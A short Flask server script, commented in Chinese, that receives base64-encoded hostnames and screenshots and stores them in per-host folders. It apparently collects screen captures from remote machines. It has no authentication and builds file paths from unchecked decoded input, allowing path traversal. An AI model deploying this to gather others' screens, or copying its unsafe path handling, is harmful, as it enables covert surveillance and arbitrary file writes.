from flask import Flask,request,jsonify
import os,base64
app = Flask(__name__)

@app.route('/upload',methods=['POST'])
def upload():
    if not os.path.exists('screenshots'):
        os.mkdir('screenshots')
    hostname = request.form.get('hostname')
    img = request.form.get('screen')
    filename = request.form.get('time')
    #解密
    host_data = base64.b64decode(hostname.encode()).decode()
    img_data = base64.b64decode(img.encode())
    file_data = base64.b64decode(filename.encode()).decode()
    #检测是否存在文件夹
    if not os.path.exists('screenshots/' + host_data):
        os.mkdir('screenshots/' + host_data)
    #写入文件
    screens = open('screenshots/' + host_data + '/' + file_data + '.jpg','wb')
    screens.write(img_data)
    screens.close()
    return jsonify({'status':0})
     
app.run('0.0.0.0',8000)